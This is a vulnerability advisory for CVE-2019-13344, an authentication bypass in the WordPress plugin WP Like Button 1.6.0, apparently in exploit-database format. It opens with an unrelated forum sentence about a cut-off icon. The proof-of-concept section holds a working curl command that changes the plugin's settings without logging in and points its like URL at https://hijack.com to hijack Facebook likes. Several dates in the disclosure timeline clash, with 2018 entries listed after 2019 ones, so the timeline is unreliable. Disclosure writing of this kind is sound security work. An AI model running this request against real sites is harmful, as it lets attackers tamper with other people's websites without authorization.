The icon is not complete on my website, it appears half cut off. I’ve tried using the fix in the forum and it did not work.

# [WP Like Button 1.6.0 - Auth Bypass](../articles/wp-like-button-auth-bypass.html)

Exploit Title: WP Like Button 1.6.0 - Auth Bypass

Date: 05-Jul-19

Exploit Author: Benjamin Lim

Vendor Homepage: http://www.crudlab.com

Software Link: https://wordpress.org/plugins/wp-like-button/

Version: 1.6.0

CVE : CVE-2019-13344

# 1. Product & Service Introduction:

WP Like button allows you to add Facebook like button on your wordpress blog. You can also add Share button along with Like button or can add recommend button. As of now, the plugin has been downloaded 129,089 times and has 10,000+ active installs.

# 2. Technical Details & Description:

Authentication Bypass vulnerability in the WP Like Button (Free) plugin version 1.6.0 allows unauthenticated attackers to change the settings of the plugin. The contains() function in wp\_like\_button.php did not check if the current request is made by an authorized user, thus allowing any unauthenticated user to successfully update the settings of the plugin.

# 3. Proof of Concept (PoC):

For example, the curl command below allows an attacker to change the each\_page\_url parameter to https://hijack.com. This allows the attacker to hijack Facebook likes.

`curl -k -i --raw -X POST -d "page=facebook-like-button&site_url=https%%3A%%2F%%2Flocalhost%%2Fwp&display[]=1&display[]=2&display[]=4&display[]=16&mobile=1&fb_app_id=&fb_app_admin=&kd=0&fblb_default_upload_image=&code_snippet=%%3C%%3Fphp+echo+fb_like_button()%%3B+%%3F%%3E&beforeafter=before&eachpage=url&each_page_url=https://hijack.com&language=en_US&width=65&position=center&layout=box_count&action=like&color=light&btn_size=small&faces=1&share=1&update_fblb=" "https://localhost/wp/wp-admin/admin.php?page=facebook-like-button&edit=1" -H "Content-Type: application/x-www-form-urlencoded"`

# 4. Mitigation

Users are advised to update to version 1.6.1 and above.

# 5. Disclosure Timeline

2019/06/24 Vendor contacted regarding vulnerability in v1.5.0 (crudlab@gmail.com)

2019/06/30 Second email sent to vendor (crudlab@gmail.com)

2019/07/02 Vendor released v1.6.0 update. Vulnerability still exists. Vendor did not acknowledge any emails.

2018/07/03 Third email sent to vendor's billing email domain (info@purelogics.net)

2018/07/05 Public disclosure

2018/07/08 Wordpress plugins team notified. Plugin removed.

2019/07/09 Vendor released v1.6.1 update. Vulnerability fixed.
